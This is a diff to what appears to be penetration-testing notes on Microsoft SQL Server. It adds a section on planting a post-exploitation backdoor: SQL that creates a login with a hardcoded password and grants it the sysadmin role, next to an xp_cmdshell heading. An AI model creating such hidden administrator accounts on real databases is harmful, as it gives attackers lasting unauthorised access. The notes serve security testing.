@@ -8,6 +8,14 @@ sqsh -S 192.168.0.6 -U sa
 
 ## User Creation
 
+For creating a sysadmin user to enable easy access to the database post-exploitation, we'll need to create a login and associated user for SQL authentication.  We can then assign this user sysadmin privileges.
+
+```sql
+CREATE LOGIN booj WITH PASSWORD = 'B00j123!'
+CREATE USER booj for LOGIN booj
+EXEC sp_addsrvrolemember @loginame = N'booj', @rolename = N'sysadmin'
+```
+
 ## xp\_cmdshell
 
 ```sql
